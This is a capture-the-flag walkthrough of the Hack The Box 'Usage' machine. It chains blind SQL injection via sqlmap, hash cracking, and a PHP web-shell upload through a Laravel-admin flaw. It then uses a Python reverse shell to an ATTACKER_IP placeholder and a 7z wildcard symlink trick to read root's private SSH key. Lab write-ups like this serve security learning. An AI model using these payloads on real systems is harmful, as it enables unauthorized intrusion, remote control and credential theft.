🔐 HTB: Usage – Writeup / Walkthrough

Difficulty: Medium
Category: Linux / Web / Privilege Escalation

🧠 TL;DR

    🐛 SQLi in password reset → Extracted admin hash

    🔓 Cracked hash → Admin login

    ☠️ CVE-2023-24249 (Laravel-admin RCE) → Reverse shell

    🔍 Found password in .monitrc → Pivoted to xander

    🔧 Sudo misconfigured binary → Wildcard 7z abuse → Read root's private key

🔍 Initial Recon

nmap -sC -sV -v <target-ip>

    🔓 Open ports: 22 (SSH) and 80 (HTTP)

Accessing http://usage.htb, I noticed a password reset functionality. Submitting an email payload like:

test@example.com'

➡️ Triggered a 500 error — potential SQL injection.
🧬 SQL Injection → Admin Credentials

Intercepted the password reset POST request with Burp Suite and saved it to reset.req.

Used SQLMap:

sqlmap -r reset.req -p mail --level 5 --risk 3 --technique=B --batch

✅ Confirmed blind SQLi, extracted DBs:

sqlmap -r reset.req --dbs

Found: usage_blog
Dumped admin credentials and cracked the hash with hashcat:

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

🧠 Recovered the admin password → Logged in.
🖥️ RCE via Laravel-admin (CVE-2023-24249)

Admin panel disclosed Laravel-admin v1.8.18, vulnerable to arbitrary file upload.

Exploited via /users/1/edit:

    Intercepted profile update

    Replaced avatar field with shell.php payload:

<?php system($_GET['cmd']); ?>

After uploading, accessed the file and triggered RCE:

curl "http://usage.htb/uploads/shell.php?cmd=whoami"

Used a Python reverse shell from revshells.com:

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

🎯 Shell as dash.
🔑 Lateral Movement → xander

Found .monitrc in dash's home directory → contained a password.

Tried it for xander:

su xander

✅ Successful login.
⚔️ Privilege Escalation → Root via 7z Wildcard Injection

sudo -l

Found:

(ALL) NOPASSWD: /usr/bin/usage_management

This script allowed backups using 7z, but other options failed.

Used:

strings /usr/bin/usage_management

Saw 7z a backup.7z * — vulnerable to wildcard abuse.

Used HackTricks trick:

touch '@id_rsa'
ln -s /root/.ssh/id_rsa id_rsa

Ran the backup option:

sudo /usr/bin/usage_management

💥 Contents of /root/.ssh/id_rsa were printed in terminal.

Saved the private key locally and logged in as root:

chmod 600 id_rsa
ssh -i id_rsa root@usage.htb

🏁 Flags

    user.txt → Found after reverse shell

    root.txt → Retrieved after 7z wildcard abuse

✅ Takeaways

This box was a solid combo of web exploitation + local misconfig abuse:

    SQLi → Admin access

    PHP file upload → Remote Code Execution

    Credential reuse → Lateral movement

    7z wildcard trick → Full root compromise
